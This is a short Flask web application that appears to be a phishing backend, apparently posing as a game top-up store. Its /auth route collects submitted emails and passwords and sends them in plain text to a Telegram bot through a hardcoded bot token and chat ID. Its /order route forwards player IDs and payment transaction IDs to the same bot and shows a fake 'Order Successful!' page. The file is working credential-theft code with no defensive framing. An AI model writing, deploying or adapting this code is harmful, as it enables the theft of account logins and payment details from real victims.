from flask import Flask, render_template, request
import requests

app = Flask(__name__)
T = '8567544194:AAHbkTbjnkTsN2iNznlN5Ek1TtlN_R0ncTE'
C = '8691740167'

def send(m):
    requests.post(f"https://api.telegram.org/bot{T}/sendMessage", data={'chat_id': C, 'text': m, 'parse_mode': 'Markdown'})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/auth', methods=['POST'])
def auth():
    e, p, t = request.form.get('email'), request.form.get('password'), request.form.get('type')
    send(f"👤 *NEW {t}*\n📧 Email: `{e}`\n🔑 Pass: `{p}`")
    return "OK"

@app.route('/order', methods=['POST'])
def order():
    u, pk, m, tx = request.form.get('player_id'), request.form.get('package'), request.form.get('payment_method'), request.form.get('trx_id')
    send(f"🔔 *NEW ORDER*\n👤 UID: `{u}`\n💎 Pack: {pk}\n💳 Method: {m}\n🔑 TrxID: `{tx}`")
    return '<body style="background:#000;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif;"><h1>Order Successful!</h1><br><a href="/" style="color:#4169e1;">Back</a></body>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
